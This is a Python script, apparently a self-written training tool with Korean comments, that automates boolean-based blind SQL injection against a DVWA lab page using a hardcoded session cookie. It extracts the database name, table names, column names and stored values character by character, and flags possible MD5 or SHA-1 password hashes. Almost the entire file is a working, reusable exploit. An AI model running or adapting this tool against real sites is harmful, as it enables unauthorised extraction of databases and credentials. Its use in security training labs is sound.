import requests
from bs4 import BeautifulSoup
from colorama import init,Fore,Back,Style
import argparse
init(autoreset=True)
#########################################  -MySQL .Blind SQL injection Tool- Cor.Hs/19.09.07 #########################################

url = 'http://192.168.2.133/DVWA/vulnerabilities/sqli_blind/'
q_true = 'User ID exists in the database.'
session = 'PHPSESSID' # 세션 아이디
session_val = 'r1c30jf127m42mq24itdi8kdg5' #세션 값

session2 = 'security' #추가 세션 아이디
session_val2 = 'low' #추가 세션 값

parameter = 'id' #취약한 파라미터

parameter2 = 'Submit' #추가 파리미터
param_val2 = 'Submit' #추가 파라미터2
dbstr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l'
        , 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x'
        , 'y', 'z','!',',','@','$','%','&','_','-','*','(',')','/',':',';','.'," ","  ","   ","    ","     "
        ,'[',']','_','-','&&','|','||','<','>','!!','0','1','2','3','4','5','6','7'
         ,'8','9']

cookies = {session: session_val, session2: session_val2}
table_name = ['','','','','','','','','','','','','','']

def Request_(sql_query): ################# SQL INJECTION ! ###################
    data = {parameter: sql_query,
            parameter2: param_val2
            }
    #res = requests.get('http://192.168.186.174/bWAPP/sqli_4.php', cookies=cookies, params=data)
    res = requests.get(url, cookies=cookies, params=data)
    html = res.text
    result = BeautifulSoup(html, 'html.parser')
    result = result.find('div')
    result = result.prettify()
    result_list = result.split('\n')
    #print(result_list)
    return result_list

def TABLE_string_(dbstr_real , tlength , table_limit,k): #################### 테이블 명 구하는 함수 ###################
    sw = 0
    finish = 1
    index = -1
    dbstrlen = -1
    strstr = ['','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','']
    while sw < tlength: # 테이블 명 의 문자열 길이 만큼 반복
        while 1: # a~z문자 찾을때까지 반복
            if finish > tlength: #테이블 명의 문자열 길이보다 크다면 종료
                table_name = (''.join(strstr)) # 추출한 각 테이블 저장.
                print(Fore.YELLOW+Style.BRIGHT+"%d. %s"%((k+1),table_name))
                break
            dbstrlen = dbstrlen + 1

            sql_query = "' or 1=1 and substring((select table_name from information_schema.tables where table_schema = '" + str(dbstr_real) + "' limit " + str(table_limit) + ',1),' + str(finish) + ',1)= ' + "'" + dbstr[dbstrlen] + "'#"
            #print(sql_query)
            result_list = Request_(sql_query) # 리퀘스트 함수 호출
            #print(table_string)
            sw = sw + 1
            for i in result_list:
                if q_true in i:
                    index = index + 1 # strstr 값 증가
                    strstr[index] = dbstr[dbstrlen]
                    finish = finish + 1
                    dbstrlen = -1 # a ~ z 문자 초기화
                    #print("==================================================")
                    #print(strstr)
                    break

def DB_length_(): ################### db 스키마 , db 스키마 length 구하는 함수 # ###################
    num = 0
    col = 0
    dbstr_ = ['','','','','']
    dbstrlen = -1
    switch = 0

    while switch != 1:
        num = num + 1
        sql_query = "' or 1=1 and length(database())  = " + str(num) + '#'
       # print(sql_query)
        result_list = Request_(sql_query)  # 리퀘스트 함수 호출
        col = col + 1

        for i in result_list:
            if q_true in i:
                #print(i)
                switch = 1
                break
    #print("데이터베이스 스키마 이름 length : '%d' 입니다." % col)
    dbnum = 1
    j = 0

    while j < col:
        num = num + 1
        dbstrlen = dbstrlen + 1
        sql_query = "' or 1=1 and substring(database()," + str(dbnum) + ", 1) = " +"'" + dbstr[dbstrlen]+"'" +  '#'
        #print(sql_query)
        result_list = Request_(sql_query)  # 리퀘스트 함수 호출
        #print(dbstring)
        for i in result_list:
            if q_true in i:
                #print(i)
                dbstr_[j] = dbstr[dbstrlen]
                dbstrlen = -1
                dbnum = dbnum + 1
                j = j + 1
                break
        if dbnum > 5:
            break
    print(Back.GREEN+"      Payload Success!      ")
    print("Database : '%s' " % ''.join(dbstr_))
    print("+--------------------------+")
    print(Back.RED+"TABLES")
    print("+--------------------------+")
    return dbstr_ , col

dbstr_,col=DB_length_() # 스키마명 , 스키마length 가져오기
dbstr_real=(''.join(dbstr_)) #스키마 문자로 치환

def TABLE_length_(): ####################  각 테이블의 length 구하는 함수 ###################
    table_limit = 0
    table_len = 0
    real_tablelen = [0,0,0,0,0]
    k = -1
    while 1:  # 무한 loop
        table_len = table_len + 1
        sql_query = "' or 1=1 and length((select table_name from information_schema.tables where table_schema='" + dbstr_real + "'" + ' limit ' + str(table_limit) + ',1))' + '=' + str(table_len) + '#'

        result_list = Request_(sql_query)  # 리퀘스트 함수 호출

        if table_len > 10:
            break
        for i in result_list:
            if q_true in i:
                #print(i)
                k = k + 1
                tlength = table_len
                #print("%d 번째 테이블 이름의 갯수 %d : "% (k ,tlength))
                TABLE_string_(dbstr_real, tlength , table_limit,k) ################함수 호출##################
                real_tablelen[k] = table_len # n번째 테이블 문자열 갯수
                table_len = 0 # 테이블 문자열 갯수 초기화
                table_limit = table_limit + 1 # 1번째..2번째..3번째...테이블
                break
    return real_tablelen

real_tablelen = TABLE_length_() # 각 테이블의 length 구하는 함수
print("+--------------------------+")

########################################################################################################################

print(Back.RED+"COLUMNS")

def COLUMN_string_(tlength , column_limit,k,user_input): #################### 칼럼 명 구하는 함수 ###################
    sw = 0
    finish = 1
    index = -1
    columnstrlen = -1
    strstr = ['','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''
              ,'','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''
              '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '','', '', ''
              , '', '', '', '', '', '', '']
    while sw < tlength: # 칼럼 명 의 문자열 길이 만큼 반복
        while 1: # a~z문자 찾을때까지 반복
            if finish > tlength: #칼럼 명의 문자열 길이보다 크다면 종료
                table_name = (''.join(strstr)) # 추출한 각 칼럼 저장.
                print(Fore.YELLOW+Style.BRIGHT+"%d. %s"%((k+1),table_name))
                break
            columnstrlen = columnstrlen + 1

            sql_query = "' or 1=1 and substring((select column_name from information_schema.columns where table_name = '" + str(user_input) + "' limit " + str(column_limit) + ',1),' + str(finish) + ',1)= ' + "'" + dbstr[columnstrlen] + "'#"
            #print(sql_query)
            result_list = Request_(sql_query) # 리퀘스트 함수 호출
            #print(table_string)
            sw = sw + 1
            for i in result_list:
                if q_true in i:
                    index = index + 1 # strstr 값 증가
                    strstr[index] = dbstr[columnstrlen]
                    finish = finish + 1
                    columnstrlen = -1 # a ~ z 문자 초기화
                    #print("==================================================")
                    #print(strstr)
                    break

def COLUMN_length_(user_input): ####################  각 칼럼의 length 구하는 함수 ###################
    column_limit = 0
    column_len = 0
    real_columnlen = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                      ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                      ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
    k = -1
    while 1:  # 무한 loop
        column_len = column_len + 1
        sql_query = "' or 1=1 and length((select column_name from information_schema.columns where table_name=" + "'" + str(user_input) + "'" + ' limit ' + str(column_limit) + ',1))' + '=' + str(column_len) + '#'

        result_list = Request_(sql_query)  # 리퀘스트 함수 호출

        if column_len > 20:
            break
        for i in result_list:
            if q_true in i:
                #print(i)
                k = k + 1
                tlength = column_len
                #print("%d 번째 테이블 이름의 갯수 %d : "% (k ,tlength))
                COLUMN_string_(tlength , column_limit,k,user_input) ################함수 호출##################
                real_columnlen[k] = column_len # n번째 컬럼 문자열 갯수
                column_len = 0 # 컬럼 문자열 갯수 초기화
                column_limit = column_limit + 1 # 1번째..2번째..3번째...컬럼
                break
    # return real_tablelen3

def VALUE_string_(tlength , value_limit,k,user_input_value,user_input): #################### 칼럼 명 구하는 함수 ###################
    sw = 0
    finish = 1
    index = -1
    valuelen = -1
    strstr = ['','','','','','','','','','','','','','','','','','','','','','','',
              '','','','','','','','','','','','','','','','','','','','','','','',
              '','','','','','','','','','','','','','','','','','','','','','','']
    while sw < tlength: # 칼럼 명 의 문자열 길이 만큼 반복
        while 1: # a~z문자 찾을때까지 반복
            if finish > tlength: #칼럼 명의 문자열 길이보다 크다면 종료
                value = (''.join(strstr)) # 추출한 각 값 저장.
                print(Fore.YELLOW+Style.BRIGHT+"%d. %s"%((k+1),value))
                break
            valuelen = valuelen + 1
            if valuelen > 65:
                exit(0)
            sql_query = "' or 1=1 and substring((select " + str(user_input_value) + " from " + user_input +  " limit " + str(value_limit) + ',1),' + str(finish) + ',1)= ' + "'" + dbstr[valuelen] + "'#"
            result_list = Request_(sql_query) # 리퀘스트 함수 호출
            #print(table_string)
            sw = sw + 1
            for i in result_list:
                if q_true in i:
                    index = index + 1 # strstr 값 증가
                    strstr[index] = dbstr[valuelen]
                    finish = finish + 1
                    valuelen = -1 # a ~ z 문자 초기화x
                    #print("==================================================")
                    #print(strstr)
                    break

def VALUE_length_(user_input , user_input_value): ####################  각 칼럼의 값 length 구하는 함수 ###################
    value_limit = 0
    value_len = 0
    real_value = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                      0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                      ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                      ,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
    k = -1
    while 1:  # 무한 loop
        value_len = value_len + 1
        sql_query = "' or 1=1 and length((select " + user_input_value + ' from ' + user_input + ' limit 0,1)) = ' + str(value_len) + '#'
        #print(sql_query)
        result_list = Request_(sql_query)  # 리퀘스트 함수 호출
        if value_len > 41:
            print("---------------------------------------Attack finish...------------------------------------------")
            exit(0)
        if value_len == 40:
            print(Back.YELLOW+"[Warning]"+"조회중 입니다. 'sha-1' 가능성이 있습니다. ")
        if value_len == 32:
            print("[Warning] 조회중 입니다. 'md5' 가능성이 있습니다.")
        for i in result_list:
            if q_true in i:
                #print(i)
                k = k + 1
                tlength = value_len
                #print("%d 번째 테이블 이름의 갯수 %d : "% (k ,tlength))
                VALUE_string_(tlength , value_limit,k,user_input_value, user_input) ################함수 호출##################
                real_value[k] = value_len # n번째 컬럼 문자열 갯수
                value_len = 0 # 컬럼 문자열 갯수 초기화
                value_limit = value_limit + 1 # 1번째..2번째..3번째...컬럼
                break

print("+--------------------------+")
user_input = input(' -> 컬럼을 추출할 테이블 문자열을 입력하세요 : ')
COLUMN_length_(user_input)
print("+--------------------------+")
user_input_value = input(' -> 데이터를 추출할 컬럼의 문자열을 입력하세요 : ')
print("+--------------------------+")
print(Back.RED+"VALUES")
print("+--------------------------+")
VALUE_length_(user_input,user_input_value)
print("+--------------------------+")
print("---------------------------------------Attack finish...------------------------------------------")